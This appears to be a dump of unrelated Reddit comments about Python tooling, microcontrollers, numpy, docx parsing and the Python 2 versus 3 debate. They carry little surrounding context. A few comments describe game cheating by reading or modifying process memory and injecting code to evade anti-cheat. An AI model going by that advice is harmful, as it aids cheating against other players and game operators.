You'd want to look at micropython and maybe ask /r/embedded or /r/AskElectronics for specific hardware. Micropython can be run on an esp32, a wifi-enabled microcontroller. So thats /r/esp8266 or /r/esp32. If I were you I would skip the ESP32 and go for the stm32 hardware, debugging on this platform is easier. You could also look at PSoC microcontrollers, not exactly what you were looking for but i'm a fanboy for their hardware and especially their documentation. I drool when I have to read their datasheets and application notes. [A PSoC 5LP](http://www.cypress.com/documentation/development-kitsboards/cy8ckit-059-psoc-5lp-prototyping-kit-onboard-programmer-and) is cheap and easy to use and their IDE is free to use. &amp;#x200B;
I'm the OP and I don't think you should switch from PIL to Snowy unless you need one of its unique features such as high-precision filtering, direct manipulation of numpy arrays, custom boundary behavior, noise generation, or distance field generation.
My reading of this: there's a difference between should and would; you gave two good reasons why someone might want to use C over Rust, but the response is that they're not compelling enough to amount to "should".
If you like numpy I have a slick way to do sums of subsets. Suppose you have an array- z and you want a subset of indices, group = (0,1,5) Print z.shape #check to make sure it’s numpy Group = (5,7,9) Zprime = z[np.array(group)].sum() 
With respect, can you link some docs? It's not that I don't believe you, just that I'm bad at understanding what you're trying to say and googling your words as well as words from the PEP do not bring up any such results.
If it 'aint broke, don't fix it. In my experience, all of these things do exactly the same thing. Unless you have a special use case, you won't notice any difference.
That's kind of what I thought. A few years ago everyone said to use viturualenv wrapper, but there was little to be gained in my opinion. I preferred having slightly more control using virtualenv and I knew the commands well enough. 
Depending on your needs you may be able to use a Raspberry Pi instead of an Arduino. They have a Python module for controlling GPIO pins.
How did you use a regex? You had a docx. What is your question?
Note that Pipenv and Pyenv are different tools for different problems. Pyenv helps ensure the right versions of Python are installed and available. Pipenv helps manage your packages and dependencies. Though Pipenv can also help manage your virtual environment it won’t create a new one if a virtual environment already exists and so you could use virtualenv if you preferred.
This is pretty interesting - my team has been working on a project with pyinvoke for awhile now, and this could be a much more interactive/fluid experience than that has been! &amp;#x200B;
Thank you for your answer. This is hard for me.

With Anaconda, I can use a python 2.7, a 3.6, and a 3.7 env. They lag a bit on the latest versions, but it just works. I update once every few months, so whatever. It also comes with the Intel MKL libraries so my code is 5x faster.
Why r/Python? From the request I'd say some low-code development platform, Xojo or LiveCode come to mind.
I tried this one, but get an error too: # -*- coding: utf-8 -*- data = [ 2.95, 2.26, 3.93, 2.38*2, 1.98, 1.93, 1.64, 0.53, 1.20, 2.06, 2.18, 2.12, 3.20, 1.29, 1.20, 2*0.65, 1.84*2, 1.85*2, 1.58*3, 1.46*3, (1.48*3+0.22), 1.12*4, 1.18*3, 2.38+0.02, 0.65*5, 3.23, 1.60, 0.58, 4.01, 1.09*3, 0.60] #import pandas as pd import numpy as np ids = [0,0,1,2,2,1] np.bincount(ids, weights=data) &amp;#x200B;
Given the level of experience of the original poster and vaguely recalling time commitments at that age, I think this is probably the only reasonable choice.
The MicroPython PyBoard might be what you're looking for. If you want Wifi and a tiny screen, get an ESP8266 + SSD1306 and flash MicroPython onto it.
Other than Anaconda for data science/ML I haven’t found anything distinctive about them (I’ve never used PyEnv though).
Does Pyenv offer me anything over my OS's package manger for installing Python (usually apt-get)? 
 activate myenv doesn't gain a whole lot over: . /path/to/myvirtualen/bin/activate 
It might be blasphemous to say on /r/python, but the best way not to suck ass at C++ is to do projects in it. 
Obviously i cant complain since its a free open source project and i appreciate that. But as far as I remember most operating systems come with 3.5 (i may be wrong), and ton of people still use python 2 for some reason. Thats like creating an android app for android 7+. You can use great features but you lose the majority of people that didnt bother to upgrade.
i can do txt2po just fine, but whenever I try po2html or po2json I get a template error
pep394 recommends that `python` should be used only if the code works in both major versions. 
I'm learning myself, but by reading through the course spec, a maths quiz app might be a good idea. They could list player names and high scores in a dictionary. The random module could be imported to generate random maths questions. Data could be gathered based on performance on different types of questions. Once the game is complete, the data could be save to a text, csv or excel file (there's a pretty cool xlms library that makes writing to excel easy, but I guess that'd involve extra learning). It's not perfect, but it's a good start and leaves a lot of options to add further tasks. 
What I'm asking is, how do I get the direct sentence in .docx file? My code above is just an example. I can change the code into : &amp;#x200B; txt = open('file.docx', 'r') pttrn = re.compile(r'(\.|\?|\!)(\'|\")?\s') new = re.sub(pttrn, r'\1\2\n\n', txt) print(new) But I didn't get the direct sentence

C++ is simple for basic I/O. There are tons of examples of growboxes programmed in it online already
Yes and no. If `virtualenv` alone works for you, there's no practical reason for you to change. That said, `virtualenv` solves *one* problem - that of isolating your project's installed packages into a separate environment. The other tools you listed solve other problems, though some of them also help isolate project environments. ## My setup After writing the below, I thought I'd add my own preferred setup here. I use `pipenv` to create and manage project environments, install packages, and manage dependencies. I use `pyenv` to manage the versions of Python I have installed. I don't have the `pyenv` configured as is recommended - `$(pyenv root)` is not on my path. That means I have to manually specify the path to the python version I want to use when I create an environment, but it also means that my shell environment has less complexity. When I call `python`, I get the system Python 100% of the time. I also have `PIP_REQUIRE_VIRTUALENV=1` set, which prevents me from accidentally installing a package system-wide. ## Anaconda Anaconda is the one with which I'm least familiar, having not used it in quite some time. If memory serves, it's primary reason for existence is two-fold: it eases the installation of the Python interpreter, and it bundles many binary dependencies. Anaconda is very much "batteries included". You're not just getting Python itself, [you're getting several IDEs and commonly-used data science packages out of the box](https://www.anaconda.com/wp-content/uploads/2017/08/Anaconda-Distribution-Diagram.png). Binary dependencies are a pain, generally speaking, especially when you're working on multiple platforms. For example: to install PIL on macOS, you have to also install the Xcode Command Line Tools so you can compile the C extensions. This is even worse for data science packages, many of which require Fortran or other heavyweight dependencies. If you're using Anaconda they're just "there". You don't have to worry about it. Further, it comes with `conda`, which serves basically the same purpose as `pip` - except, again, it installs compiled binary dependencies, which is both faster and simpler than tracking them down and compiling them on your own system. `conda` also lets you manage environments (a'la `virtualenv`) and Python version (a'la `pyenv`). ## Pyenv `pyenv` is designed to let you easily install multiple Python versions and switch between them at will. It shines when you're working on multiple projects on the same machine, each of which has its own pinned version. For instance - I have two web apps on my laptop right now, one of which uses Python 2.7.14 and the other Python 3.6.2. I installed both of those versions with `pyenv`, while leaving my macOS-provided Python (2.7.10) alone. When I'm in a project directory, `pyenv` knows which version to use and just calling `python` gets me the correct one. ## Pipenv `pipenv` is my tool of choice. Think of it as "`pip` on steroids" - and in fact, most of what it does is wrap `pip`. It helps you manage two files that make your life easier: `Pipfile` and `Pipfile.lock`. `Pipfile` is basically a replacement for the `requirements.txt` that you're currently using. It's a different syntax, and allows you to specify development-only requirements, but otherwise serves pretty much the same purpose. `Pipfile.lock` is where some magic happens. It specifies not only the version of packages that are installed in your environment, but also their hashes. This means that when you install `my_awesome_package` version `1.2.3`, you know with certainty that the package you install is byte-for-byte identical to the one you installed last time. The other big thing is that with `requirements.txt`, *all* installed packages are listed, including their version. With `Pipfile`, only the top-level packages (the ones you install) are listed, which makes it much, much easier to see what's actually being used. When you upgrade a package, all of its dependencies are also upgraded. `pipenv` also lets you manage (but not install!) multiple version of Python, manage isolated environments, visualize your installed packages, check for security updates for your dependencies... and probably quite a bit more that's not coming to mind right now.
I know there are but i need to write my own code since they expect me to know it perfectly (this is supposed to be my project) i am asking this just so it's easyer for me to decide what platform i want to make it on.
Thanks for the comprehensive answer. 
OK, that makes sense. How long did it take you to make this library?
This is the right comment. Would be nice to prototype in Python though.
No problem. I was waiting for my automated tests to run anyhow, and chatting here about Python keeps my head space in the right place. Plus, I've already read everything interesting on HN this morning :)
Go for MicroPython on ESP32, it's very easy to get going. 
I'll ask you a question: Without taking into account the meaning of any sentance or individual words, how do you distinguish between a direct sentance and an indirect sentance?
What do you mean by get the direct sentence? I ask about the docx part because that's not how you interface with a docx. A docx is a compressed folder with mainly html files that define all their fancy formatting. Microsoft wrote the "standard" and didn't document much of it. That's why Libre/OpenOffice isn't quite right.
It is when you don't remember which envs you have. Anaconda will tell you where they all are. Also, I like it, but it is small.

If you're going for Android don't use python. You COULD use Kivy or other frameworks, but I believe the best options for Android are Java and C#, although C# Android development is pretty much restrained to Windows unless you're developing stuff on Unity. Javascript if you're pushing it. Not that Python would be bad, it's just that it doesn't have such an as widespread usage as the other languages and due to that you could have a hard time finding support for the issues you will most surely find along the way. 
In my opinion, no. If you're already using virtualenv, I don't see what pipenv adds other than a lock file for dependency versioning. If I wanted something more than venv, I would just go all-in and use something like Poetry that is more closely related to the C# dotnet cli, Rust's cargo cli, or npm. Otherwise, I'm fine just using venv, pip, and terminal, especially since I don't really use python for big projects or projects I need to distribute.
Quite possibly my favorite thing in my .bash_profile/.bashrc: venvmk() { mkdir -p ~/.venv pushd ~/.venv virtualenv $@ popd } venvls() { ls -1 "${HOME}/.venv/"; } venv() { source "${HOME}/.venv/${1}/bin/activate"; }
Python didn't kill your PC. Your PC happened to die while you were installing Python.
Yes. I've done a grow sale with an RPi.
This post is better suited for r/learnpython 
^this
That's always worth considering when adopting newer technologies. 
I seem to have python 2.7, 3.4 and 3.5 on the machine I am typing on. I don't remember doing anything special to get all of those on it. virtualenv with -p to select which one I want.
Does that create a separate virutalenv for each shell?
I have multiple python2.7 lambdas in aws that I just haven't gotten around to refactoring. They do very basic things, and honestly, there's no particular need to go through the trouble until its broken, or I know it won't be supported. The latter is likely to happen with AWS eco systems momentum. I am just curious how others feel about letting stuff that works just be? Maybe its the sysadmin mentality I came from, but if it ain't broke don't fix it, is a common refrain!
Well Python 2.7 was old when you started writing lambdas...so I guess I wouldn't have found myself in that situation in the first place. :) 
Thanks for the help guys

You can still use Python to control an Arduino indirectly. In the Arduino IDE, select Examples-&gt;Firmata-&gt;Standard Firmata and flash your Arduino with it. After installing PyFirmata: `pip install pyfirmata` You can then control all pins like this: &gt;&gt;&gt; from pyfirmata import Arduino, util &gt;&gt;&gt; board = Arduino('/dev/tty.usbserial-A6008rIF') &gt;&gt;&gt; board.digital[13].write(1) More here: https://github.com/tino/pyFirmata
Those are bash functions, so you call them as if they were programs. I.e., a session might look like this: te $ venvls p27 p37 terra zag te $ venv zag (zag) te $ # I'm now in the zag virtualenv (zag) te $ deactivate te $ venvmk -p python3 doom Running virtualenv with interpreter /usr/local/bin/python3 Using base prefix '***' ***/site-packages/virtualenv.py:1047: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses import imp New python executable in /home/te/.venv/doom/bin/python3.7 Also creating executable in /home/te/.venv/doom/bin/python Installing setuptools, pip, wheel...done. te $ venvls doom p27 p37 terra zag te $ venv doom (doom) te $
Ahh that’s pretty nice they look like good alternatives, are these projects private btw?
I found an other solution but still not a good solution based on this [other stackoverflow question](https://stackoverflow.com/questions/49869644/generating-all-possible-combinations-in-a-range-using-numpy-in-python): &amp;#x200B; from numpy import \* from itertools import \* montab = \[ 2.95, 2.26, 3.93, 2.38\*2, 1.98, 1.93, 1.64, 0.53, 1.20, 2.06, 2.18, 2.12, 3.20, 1.29, 1.20, 2\*0.65, 1.84\*2, 1.85\*2, 1.58\*3, 1.46\*3, (1.48\*3+0.22), 1.12\*4, 1.18\*3, 2.38+0.02, 0.65\*5, 3.23, 1.60, 0.58, 4.01, 1.09\*3, 0.60, 0, 0\] target=7 suppaumaxde = 0.35 print montab montab.sort(reverse=True) print montab couleur='\\33\[37m' print('\\n') for colonne in combinations(montab,4): if (sum(colonne)&gt;=target and sum(colonne)&lt;=target+suppaumaxde): if (sum(colonne)&lt;=target+(suppaumaxde\*1/3)):couleur='\\33\[42m' elif (sum(colonne)&lt;=target+(suppaumaxde\*2/3)):couleur='\\33\[43m' elif (sum(colonne)&lt;=target+(suppaumaxde\*3/3)):couleur='\\033\[91m' print couleur,sum(colonne),'\\033\[0m',(colonne) &amp;#x200B; But the result isn't good and has to be improved / find an other solution : &amp;#x200B; 1.

You need the full path to the python interpreter (or that's how I do it), but yes more or less. 
No problem, look at the examples in the end of the readme here https://github.com/davisp/python-spidermonkey
I prefer `python3 -m venv`
Look up "Behavior Trees". They have only a few elementary pieces and are pretty easy to implement from scratch.
I dont want to use an external computer, i want to leave the controller and have it work automaticaly
Yes, you can. Most of them work by reading and modifying the game's data in memory.
Yes. As far as I Know WooCommerce has a RESTAPI from which you can fetch pending orders and customers' infos, then place the orders with Selenium or Python-Requests. 
Ok do you know what modules would help or if you have a guide that can also help
It's platform specific. For Windows, look into `ReadProcessMemory`. For Linux/OSX look into `/proc/mem`.
Thanks I will check
Ummm... okay... whys it called that?
Yes I've used python in the past to interact with Woocommerce via API
I agree with the others here that say the best way to not suck at C or C++ is to actually try to learn how to program in it. Python is awesome for a lot of things, but low level control of hardware is one of the reasons that an old language like C is still so popular, and pretty much a necessity in the embedded community. That said, if this is for a high school project, it probably doesn't matter that much and I'm sure you can use micropython (never even heard of it before this thread) or whatever to program your arduino. Still think it's worth learning C, though, if you ever want to get good at using microcontrollers.
We were trying to think of a name that had some word play on the "py" part of Python. After thinking about it all day, one of us was eating a pepperoni pizza and bam: Pypperoni.
I love stories about weird API names. U sir, have earnt an upvote.
As i said i learned programming through microcontrollers with bascom and then started learning python for shits and giggles, i have never been attracted to C, but i know it's potentials and i respect it as a language, i have just been turned away from it because its not that easy to understand initially (compared to my previous experience) i agree, i need to learn it and this is probably my opportunity to do so
I'm confused by this. What do you mean you don't want to use an external computer?
How does this compare to cython?
No. Channels is the defacto websocket backend for Django and it uses Asyncio. You need async libraries with Asyncio. Something like Paramiko would block the whole event loop.
Oh I understand, thanks for the info very useful for me
I can't have the controller plugged into the computer at all times so that i can use the firmata, i need to upload the programme on a microcontroller and be done with it
I'm not specifying any specific "fastest" language as I'm curious what language pulls this off. Outside of straight up machine code/assembly, I don't know what the fastest language is, but whatever it is, I'm mostly certain recursive solution would not be faster than an iterative solution. If recursion is indeed faster in said language, I'd like to know what it is.
I understood the title as you wanting to sum over a SUBSET of the main array. So suppose you wanted to sum over only the elements in indices (1,3,4,5,6,7) as opposed to the whole array: then do some thing like: import numpy as np group = (1,3,4,5,6,7) npgroup = np.array(group) subset_sum = Z[npgroup].sum() So that Z[npgroup] is an array filled with the elements of z at the indices specified by the elements of group 
&gt; but it doesn't list any libraries for me to install afterwards. I don't follow. Did you type `conda list`?
Help with what exactly ?
&gt; Do you know what is direct sentence? No. Is it just some grammatical thing? According to google, it has to do with either 1) there is a direct object 2) direct speech, and various other choices. As you asked someone else, it has to do with quotes, which is totally not obvious from your question. Is the problem loading the data or parsing the data? Also, what's with the song quotes? It's very distracting to your actual question.

Most sophisticated hacks like aimbots work by injecting large amounts of code into the target process and redirecting the game's codepaths to itself through various means - that part can't really be done in pure python (unless you consider python emitting x86 instructions to be 'pure python') but after that your hack could call back into an embedded python interpreter (with the obvious performance penalty) and have that modify the state of the game as desired. Were I to start writing hacks again I'd definitely do this as I'm spoiled by the rapid development python enables but it's unfortunately quite a surface area to hide from anticheats tbh. Not saying it can't be done ;)
Thank you!
I didn't type anything, I went to the Pycharm interpreter window, the same as I would for virtualenv, but nothing is listed. 
Or just `pyvenv`
pyvenv is deprecated: &gt; Note: The pyvenv script has been deprecated as of Python 3.6 in favor of using python3 -m venv to help prevent any potential confusion as to which Python interpreter a virtual environment will be based on. https://docs.python.org/3/library/venv.html
Yeah, I'd rather use their native library. Feels more likely that it'll be maintained.
Thanks for that. I'm using 3.5 currently so didn't notice. Guess I'll make my own script for it then so all my other scripts don't break when I upgrade.
You don't need to make your own script for it, `python3 -m venv` will work fine
I use pyvenv in multiple other scripts that I want to keep working. Easier to just keep the script than track down all those places and replace them. At least in the short run.
I'm much the same, I'll code for 12 hours straight then not do anything for a couple days. This is pretty common, at least among those I know. Strangely enough, I'm also bipolar yet the times I do or don't get any coding done don't line up with my bipolar phases at all. You'd think they would, but nope.
I think pyvenv will work for the foreseeable future. I haven't checked but it's only deprecated
True.. it it still in 3.7. Probably pre-mature of me to worry about re-creating it.
Day job
I code as my day job, but I'm fortunate to have flexible hours right now. On days I'm feeling it, I'll code pretty much all day - on days I'm not, I'll code much less. On my days off, I code at least an hour a day on personal projects or coding challenges, even when on vacation and traveling. Making it a habit helps me push through the off days. A lot of coding is creative problem solving, and it's hard to force creativity when it's just not there. On my good days I try to do the much of the big picture designing/planning as I can, so my bad days are filled with as much "grunt work" as possible. 
I'm trying to migrate to pipenv on Windows. Earlier versions of it was really buggy on Windows. I've been using it recently and so far ran into one bug. Other than that and the long pipfile lock process, it is has been a good experience. It is nice when you want to duplicate your environment later or put it into production and not worry about dependencies getting jacked up when you've updated a package. Before pipenv, I was just using python -m venv &lt;my venv name&gt;. But venv doesn't ensure your dependencies don't get jacked up if you update a package, which rarely happens for me since I don't update to latest versions of packages as soon as they are available. So to others that do, this is maybe the real advantage that pipenv has over other package managers.
If you already have a computer, an arduino using the official IDE is really simple, maybe more so than the process of writing the required SD card and learning linux basics.
I code as a hobby, and I try to get in at least an hour every day. But life happens and that isn't always doable, so u just try to get in as consistently as I can, even for just ten minutes every day.

Just program them in Arduino. Doesn't get easier than that
I code every day for my job. Not every day is python though. Working on a Vuejs electron app right now. Haven’t really touched python in a few weeks. 
How come you're using Python 2? 
If I could use Python for everything, I'd probably code every day, at least an hour or two. Alas, inevitably Java or Javascript are necessary at some point, and I end up procrastinating for days or weeks just to avoid them.
How do you like vue.js?
I write code nearly everyday, not necessarily Python. I am not technically a developer, but write in a few languages for the many projects and systems I work with. 
I think this is cool. Genuine question: did you consider contributing to existing libraries (fire, click, etc) and making these features available there instead? I've seen similar things happened in JavaScript realm where people just spin-off and create new libraries when they have new ideas that are not supported by existing ones. And that, in my opinion, makes their ecosystem a real mess. 
My code coach started me on Python2. 
Hi there, this post has been removed as it is not directly related to the Python programming language. It might be more topical on /r/programming, /r/coding, or /r/technology. Cheers, /r/Python mods
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Yeah if your going for simplicity I would go with the Pi you can just hook up a monitor mouse and keyboard and go
Does virtualenv let you easily switch between python versions? That's something pyenv is very good at 
Yes you are missing out. Why use an old 3rd party tool which you have to manually install, when you can use native `python3 -m venv` out of the box? Essentially replace `virtualenv` with `python3 -m venv` and you are done.
Daily. I do mostly Python and web for work, lots of Python/php/sql in evenings and weekends.
For small stuff have a look at: [www.pycom.io](https://www.pycom.io) &amp;#x200B;
I dunno. I don't use PyCharm, but I'm sure they have documentation on how to use it, though I don't know if they support installing packages from a list. I just install packages from the command line.
Wait, when was venv introduced?
You'r just bitter they pypped you to it.
You can check the python wiki: [https://wiki.python.org/moin/Audio/](https://wiki.python.org/moin/Audio/)
There are arduino boards that have (minimal) linux distributions (like arduino yun) on them that are capable of running python scripts... In my experience though you still need to call them from the c programs, but its a nice middle ground between a full C application and a full python application 
You could always check out Startups From The Bottom, they send daily emails with project ideas. Some of them are quite interesting. [https://www.startupsfromthebottom.com/](https://www.startupsfromthebottom.com/)
I second this
Ahh yes spend time mastering to ride a dinosaur. By the time the HS kid goes into industry it will be a fossil. 
Yeah this seems essentially useless at this point.
Huh; what was the rationale? Python 2 is on the way out.
It was a few months ago. A lot of stuff he worked on used Python2. However he gave me resources for the changes in Python3. Actually an amazing school, they have people who program for a living to come in and teach people how to program. Help them study it, make their own projects and by the end you know how to use the language to the extend you wanted to while there :D
Great answer but... boy this dependency management stuff in Python... is such a mess! At least, it looks like that to someone like me, who's just 'dabling' a bit in learning Python. Compare this to nodejs 'npm' for example (no its not trivial for sure, but at least there's one consistent tool that just does the job and you don't get confused by simply figuring out what exactly you should use to manage your dependencies). Don't get me wrong, Python is definitely a nicer language compared to javascript. But the Python folks really should get their act together somehow and avoid confusing new developers / learners by such a mess of dependency management tools. (I guess its really too late for that isn't it, unfortunately, because you can't really solve the 'too many tools' problem by making one more tool :-). 
Automating the boring stuff (the actual activity) is also a great way to learn stuff... small, achievable programs, that you already have inputs and outputs defined for.
That was a good book for me. r/python and r/learnpython are good places. If you lurk in those subs for any amount of time you will get plenty of ideas and good tutorials. 
**facepalm** How are there still any "p" words left!?
Look at Holoviews with bokeh backend
Why not just use Nuitka?
Its syntax is not similar to the familiar C/C++/Java syntax. This makes those coming from a programming background more comfortable with Python. Now, those coming from a math background instead might feel more comfortable with R. 
No I'm saying its used less and less every year, industries are using it to develop new things less and less. It may be the same age as python but python only recently (past 10 years) really picked up momentum as a industry tool. Sure C++ still and will have its place in niches that won't change anytime soon (example FORTRAN) but it will be less and less desirable as a skill as time passes. I see this all the time in industry, "I know it, I use it, you should to even if there is something else better/easier". Sure C++ is very high performing but if thats what you're interested in and don't plan on working at ORACLE then I would probably learn C. But I'm sure there are loads of people who will nay say me for being honest because they have some nostalgic loyalty to C++.
&gt;Pypperoni was designed with security as a central focus. Our compiler &gt;provides you with the necessary tools to run a secure and high quality &gt;Python application. &gt; &gt;With the removal of the interpreter, it is practically impossible to inject &gt;Python code into your program and/or recover the original source code. &gt; &gt;Additionally, by preprocessing the bytecode there may be a performance &gt;boost in your application. Unlike Cython, it seems that any performance improvements would be an accidental byproduct. 
You're complaining? I'm *thrilled* it isn't called "Pypperoni for humans!"
What would a generator, range, list, string all be a instance of that would indicate you could iterate it?
What does the #! Actually do? So you just point it to whatever binary you want to use to execute the file? What other commands can you put at the top of the file?
Thats how long it takes to write a Python to C compiler.

How are you setting your AWS credentials? It looks like that isn’t working the way you expect it to. 
Yes, but this is a new project. Why would you launch something brand new targeting a dead language today? This is a cool project and I applaud them for doing it. I just don’t quite get the reasoning for that.
3 has been out for a decade. There’s been plenty of time to upgrade
Again, not for everyone. I'm working on OSes that need to be security verified, etc, etc. If our newest machines are only 5 years behind, I'm ecstatic.
pretty sure those are cobras
Note that [the official Python docs actually call out Pipenv for dependency management](https://packaging.python.org/tutorials/managing-dependencies/). I wouldn't be surprised if it actually gets absorbed into the official Python release.
You said "lots of people" but you seem to be referring to your organization. And then you said "real programmers" as if the people who use Python 3 are not programmers.
Strange. I don't see where they're really going with "designed with security as a central focus" just due to not being able to inject python code. And making it impossible to recover the original source is not security, that's just one layer of obfuscation of the source. Haven't heard of too many vulnerabilities where people inject python code besides pickling stuff. Way more likely that you find stuff like XSS in webapps, the rare sqli somewhere if someone doesn't use an ORM or tries to handcraft a query or something, the occasional injection due to calling `os.system` or even `subprocess` but with `shell=True`, or path traversal vulnerabilities, bad auth, bad password storage, bad crypto, hidden HTTP calls that they don't expect you to modify, etc. Compiling to C does not affect those whatsoever. Logic based security bugs will exist no matter the language.
I have export AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY credentials in the shell... i.e. $ export AWS_ACCESS_KEY_ID = foo $ export AWS_SECRET_ACCESS_KEY = bar export is the same as set for windows. There are a few accepted ways in providing your credentials, this is one of them. 
I suspect you have a typo somewhere, most likely a missing closing quote, since the word “export” currently appears in your connection string. 
Fire extinguisher is lower lol
Can you go into one more level of detail with what your concern really is? You can create bunch of views one for capturing input and storing other one for doing calculations and showing results back to users. Maybe there is something I might be missing

r/learnpython
I started programming in 1994 on a TI86 for exactly this purpose... automating my math homework. I had a really awesome math teacher who was cool with it. "The way I figure it, if you can teach a machine to do it for you then you must understand it pretty well." 
Logan, I’m proud of you bud! But learn to spell “length”. :) Serious though, it’s a great feeling to finish something like that, even small scripts.
Well, no. The PyPA packaging docs mention Pipenv for certain use cases. Which is very very far from what you suggested. Also, tools like this tend to actively work to stay *out* of the standard library -- being part of Python means having your releases tied to Python's release cycle. Being separate means you can develop and release on your own schedule.
Damn it, you're right. :) Same with Google's AppEngine standard platform! 
Submitted a manuscript to a journal. Wrote a script that checks for update and if there is a update, sends a mail to me. Then added the script as a hourly cron job to my Raspberry Pi. Applied for F-1 OPT last month for me and my wife. Wrote another script the same way that checks each hour for an update to the case status. Sends an email when there is an update. Both of the scripts keep track of the updates using a JSON. All in all took an hour or so to write.
The math competitions I did in high school tended to have pretty formulaic but time consuming questions. Not sure if the organizers knew much about calculator programming but I didn’t see any rules against it, and learned myself a lot of TI Basic... hmu if you need any conic section equations in normal form
The posted code is exactly what I run with the two exported values. I do not do anything else... 
You’re not dealing with actual security if you haven’t started planning to migrate to a supported language yet.
i dont see where you are start_websocket()
You said BSOD implying Windows, but note that altering the system Python in Linux can easily hard-break your OS.

This is direct speech : She said, "I saw him." this is indirect speech : She said that she had seen him. Direct speech is the exact word that comes out from the subject. The problem is not loading the data nor parsing. The porblem is how do I take all the direct speech inside of a docx.
They're entirely different sort of libraries with different purposes. PyGame is good for 2D canvas drawing and is a python wrapper of C library SDL. PyOpenGL is good for basic 3D animations and is a python wrapper of C library opengl. As far as OpenGL goes PyOpenGL is extremely slow, compared to OpenGL bindings in other languages like C, C++, Java. PyGame is similarly slow but I had pretty ok performance with it, as long as you're not trying to make anything write heavy, you should be fine by using basic optimizations (like buffering).
Don't listen to him. Just enjoy programming for now :) You can understand the basic programming constructs in Python 2 also just fine.
I find it really enjoyable that you mistyped ‘Length’ in the file name. I have countless .py files with typos in the name and I’m not going to fix them because then I’d have to update code that imports those files!
This is beyond false. I'm going to copypasta my rant about this crap from last time. --- Well, this is really a big topic of debate. I'll give my personal opinion at the end of all the context, which I warn you, will be large. Python 3 is objectively lower on startup times (however rumor has it 3.8 will bring us to Py2.7 startup speeds, negating that argument). So if the product spends more action starting up than executing, like mercurial, you get fucked. Of course if it's not the case, except for a few super niche benchmarks, Py3 is always faster. There's also the theory of what is taught at educational institutions. Anybody who isn't a computer science major will probably be taught Py2-- they just don't need to upgrade and every algorthm can be written in Py2 as they can in Py3. Even in CS majors, many times they don't care to update. When I visted my college recently, I noticed the CS labs were running Ubuntu 12, Python 2.6/7 depending on the machine set, and the Java course was taught using Java 7, but they switched to Java 8 a week or so in. Java 10 is the current release, Java 11 will be the current release in September, 12 will come ~6 months later. Many companies using Java stay on Java 5-7, you'll be lucky if using 6+. Some companies also have to use tools like Webpack to make ES6+ JS turn into ES3 JS. *ES3*. Not ES5. I mean, if not ES3 than it would be ES5 which is the majority. The same goes for Python-- take a look at the site you are on. It was originally written in Py2.6 or earlier, evidenced by conditional code redefining some stdlib functions if not found, which were introduced in 2.7. *New* site services are being written in Py3, and when things need to be majorly refactored, they take out that service from r2 (main reddit app) and rewrite into Py3. But thats really on a "do on mini doomaday" scenario. Going back to the education thing-- lots of libraries are Py2 only. The ones public on PyPI alone are over 500. And that's the ones that are clearly labeled as Py2 only, not the ones not labeled at all. And that's on PyPI alone, there are plenty of other distribution networks as well. These are libraries that just work and their maintenance has stopped, or they depend on something of that nature. No need to change the tires when they have at least another couple thousand miles in them. This is more common in education than in business, but it exists in both worlds. In business, it gets worse-- because many times Python is used as glue. Glue to stick together a variety of things, whether it be build scripts, web servers, data pipelines, and more. Glue is generally a one time apply kind of thing. You don't use a fancy new glue unless you need to change something about the things being glued together. Because the glue just-- well, it fucking just works, and lasts a long, long time. It would cost more to update your glue than to just add a little more here and there when the edges start peeling. And then when you start glueing a new thing, you find that the fancy glue and the older glue don't mix well, so you use the older glue. Because it works. I'll give you two egrigous example-- React needs Py2 to build. Grumpy only works with Py2. As do many of the millions of lines of Python code at Google. Why? Because it will always cost more to upgrade. The points against this are as follows: * zero day attack * lack of new features * internal C bugs And the strong rebuttals are as follows: * either sand/black box or company takes the responsibility to patch the VM * company or third party patches the VM. A Py2 port called Tauthon already has a lot of Py3 syntax ported to Py2 * Py2 is more mature than Py3, if anything, time has shown Py3 has more of these rare bugs and segfaults than Py2. And again, company can patch it. The patch it thing goes back to the glue/screwdriver analogies-- why use a new version, on all of crafts, when you can make a minor change to your old version or not at all and it works? And this all started because of Py3 and how it was handled. Py2 had great backward compatibility and greater forward compatibility. Py3.0 threw this not out the window, but into the sun. The unicode debacle was horrible. 3.0, 3.1, 3.2, and 3.3, are widely regarded as Py3.0 beta, and Py3.4 being the actual Py3.0. And even then the debacle remains. Even worse, they have great backwards compatibility for 3.4-3.7 (maybe even 3.8, god willing), but horrible for forward compatibility through it, which has really given library maintainers a piece of hard as rock shit in a box and telling them to shove it back up their ass. I can elaborate on this if you'd like me to, but I won't here because it is mostly irrelevant. The point being, given all of the above, is it still so cut and dry to you? If you say yes, you arent putting yourself in the perspective of those users, and only care about yourself. Which is fine. But don't expect people to give a shit about you or your projects then. --- Now on to me. I am a Py3 evangelist. I write everything new that I need so it will work in Py3.4, and rarely say fuck it and make it work in 3.5-3.8 only. Hell, I'm even giving Pylons the port to Python3.4 that it was going to but never got, because I am a huge supporter of Pylons' model over all other Python web frameworks. Call me old fashioned. And if you do, fuck you, I'm old and grumpy. But this port won't be for public consumption, it'll be for little old me. I am not going to provide major support unless I care about the individual issue, because I am one man, and Pylons was managed by a gigantic team that decided to give up. If what I write, whatever the app, is written in such a way that it can be used in 3.4, I will also guarantee support for Py2 until at least 2025, and I know I will be writing Py2 until the day I die. Because EOL/EOS means nothing in the software world. "End of common use" does. And common is subjective to a number of factors. I'm a Py3 evangelist. Yet, ***I concede the fact that:*** ####***Py2*** ###***will*** ##***never*** #***die.*** --- This subreddit loves to shit on Py2. But it will continue to be used in education and corporate quite heavily well into 2030. You're more likely to see a business support Tauthon then to port to Py3.
While that's definitely the right answer in the "real" world, I think implementing it a bit more manually is a good idea when it's math homework.
Learn classes kid, your code structure will improve. Those globals.. arghhhhh
You don't know what you're talking about. For example, security for a us naval vessel doesn't mean fixing 0 day exploits. It's means uptime, robustness, longevity of service, hardware security so you know your motherboard wasn't tinkered with in China, replaceability and so on 
you missing the party ! No, your Python apps will run just as well as they alway have . 
